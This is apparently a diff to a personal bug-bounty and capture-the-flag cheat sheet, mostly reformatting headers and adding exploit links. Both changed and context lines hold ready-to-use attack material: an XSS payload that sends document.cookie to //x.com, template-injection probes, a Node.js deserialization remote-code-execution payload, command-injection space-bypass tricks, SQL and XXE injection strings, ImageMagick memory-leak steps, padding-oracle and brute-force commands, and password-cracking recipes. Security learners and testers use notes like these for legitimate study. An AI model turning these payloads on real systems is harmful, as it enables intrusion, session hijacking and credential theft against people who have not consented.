@@ -18,13 +18,14 @@ IMPORTANT FACT
 **if any send message or comment try "><script>window.location="//x.com"+document.cookie> to get cookie
 **if there is like id=123 then consider id=1/0 as admin account and continue attack
 **scp bob@servername.com:/home/bob/public_html/index.php Downloads/
-**cewl -d 0 -w output.txt http://x.com //used togenerate wordlist from webpages
+**cewl -d 0 -w output.txt http://x.com //used to generate wordlist from webpages
 **If found any template engine like flask jinja etc then put {{5*5}},{{config}}
 **hydra -l user-P pass.txt ftp://192.168.2.155
 
 RECON TIPS
-=================
+==================================================================================================================
 1. subdomain with aquatone
+2.Directory scan 
 3. subdomain with cencys using  443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:edited.de
   jenkins
 ---------
@@ -32,10 +33,11 @@ RECON TIPS
  try login using google account
  http://nahamsec.com/secure-your-jenkins-instance-or-hackers-will-force-you-to/
 
-2.s3 bucket
+2.s3 bucket with lazzys3
+3.shodan search hostname:,port:,os:,country:,
 
 TOOLS
-==============================
+========================================================================================================================
 dnsrebinding
 -------------
 https://www.kitploit.com/2018/05/whonow-malicious-dns-server-for.html
@@ -46,8 +48,8 @@ https://www.kitploit.com/2018/04/grok-backdoor-backdoor-with-ngrok.html
 
 
 
-CROSSDOMAIN
-=============
+CROSSDOMAIN XML
+============================================
 https://sethsec.blogspot.in/2014/03/exploiting-misconfigured-crossdomainxml.html
 http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html
 https://www.paladion.net/blogs/weak-crossdomain-xml-and-its-exploitation-poc
@@ -63,9 +65,9 @@ https://login.mailchimp.com/oauth2/authorize?response_type=token&client_id=11204
 https://prakharprasad.com/facebook-mailchimp-application-oauth-2-0-misconfiguration/
 
 FILE UPLOAD
-============
+==========================================================================================================================
 1.if image upload try 
- a) imagemagick out-of-band
+ a) imagemagick out-of-band https://www.exploit-db.com/exploits/39767/
  b) imagemagick pillete extractor
       using https://github.com/neex/gifoeb
             ./gifoeb gen 1123x987 dump.jpg
@@ -73,11 +75,11 @@ FILE UPLOAD
             ./gifoeb gen 1123x987 dump.bmp
             ./gifoeb gen 1123x987 dump.tiff
             ./gifoeb gen 1123x987 dump.tif
-         
+         download and save the preview as preview.ext
+		 r=$(identify -format '%wx%h' preview.ext[0]) && mkdir -p for_upload && for i in `seq 1 10`; do ./gifoeb gen $r for_upload/$i.gif;done
+		 Upload for_upload/*.gif to the webservice and download the previews.
 
-          for p in previews/*; do
-            ./gifoeb recover $p | strings;
-          done
+          for p in previews/*; do  ./gifoeb recover $p | strings; done
  c) pixel flood
  d) svg upload
  e) if image croping then try https://hackerone.com/reports/212696
@@ -91,8 +93,18 @@ FILE UPLOAD
 6.if docx,doc,xlsx upload
   a) try xxe
 
+ SOFTWARE VULNERABILITY
+=============================================================================================
+JETLEAk
++++++++++++++
+https://hackerone.com/reports/143935
+https://www.exploit-db.com/exploits/39455/
+https://github.com/GDSSecurity/Jetleak-Testing-Script
+ 
+ 
+ 
 APACHE
-====================
+++++++++++++++++
 Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection
 -------------------------------------
 action:, redirect:, redirectAction:, method:
@@ -101,7 +113,7 @@ https://www.exploit-db.com/exploits/44583/?rss&utm_source=dlvr.it&utm_medium=twi
 
 
 XXE via spreadsheet(doc,docx,xlsx)
-=================================
+=========================================================================================================================
 **https://buer.haus/xxegen/
 **goto https://github.com/BuffaloWill/oxml_xxe and generate many xxe payload file
 **
@@ -129,7 +141,7 @@ Relationship Id="rId1" Type="...relationships/officeDocument" Target="/word/docu
 
 
 DIRECTORY SCANNER
-================
+==========================================================================================================
 1.dirb 2.uniscan 3.nikto 4.gobuster 
 all directory wordlist and rockyou.txt locate at /home/user/Desktop/bug_bounty/CTF/wordlist
 
@@ -139,7 +151,7 @@ Xxxx'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOC
 
 
 find file
-===============
+==============================================================================================================
 find . -name testfile.txt =>current directory /subdirectory
 find /home -type f -name '*.jpg
 find / -size 50c
@@ -149,7 +161,7 @@ find / -perm 644
 find / -group shadow
 
 SERIALIZE
-=======================
+===============================================================================================================
 nodejs
 ----------
 {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
@@ -159,12 +171,12 @@ php
 O:9:"FileClass":1:{s:8:"filename";s:10:"config.php";}
 
 PHP MAGIC FUNCTION
-=====================
+============================================================================================================================
 __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state() and __clone()
 
 
 COMMAND WITHOUT SPACE
-======================
+=====================================================================================================================
 1. ls$IFS-l;
 2. {cat,file.txt}
 3. IFS=:;a=cat:file.txt;$a
@@ -366,18 +378,18 @@ admin' AND password LIKE "ya%" --
 
 
 Perl Vulneraility
-===================
+==============================================================================================
 https://ehsandev.com/pico2014/web_exploitation/make_a_face.html
 http://www.cgisecurity.com/lib/sips.html
 
 ZIP/RAR cracker
-===================
+==============================================================================================
 1.rar2john ./a.rar > hash.txt
   john ./hash.txt
 2.fcrackzip
 
 PDF && PASSWORD
-=========
+===================================
 rockyou.txt,500-passwords.txt
 pdfcrack --wordlist=crackstation-human-only.txt mypassword.pdf
 
@@ -431,8 +443,8 @@ HASH
   john --format=Raw-MD4 test.md4 --show
 2.john file //here in file put httpbasic auth
    
-md5 hash
-================
+magick md5 hash
+================================================================
 240610708=>0e462097431906509019562988736854
 9QFHA$RNXGMR3IFDU=>0e11012cfa2a998691010213eebc6f98
 4E8F8TK=>0e1100867d17d34f6b50be0e7d4a576d
@@ -670,7 +682,7 @@ padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qq
 
 RAW HASH
 ===============
-9fcef3897afe2acc3e7438ce14f5b6a3   raw hash make sql injection INCTF
+9fcef3897afe2acc3e7438ce14f5b6a3   //raw hash make sql injection INCTF
 
 MEDIA
 ====================
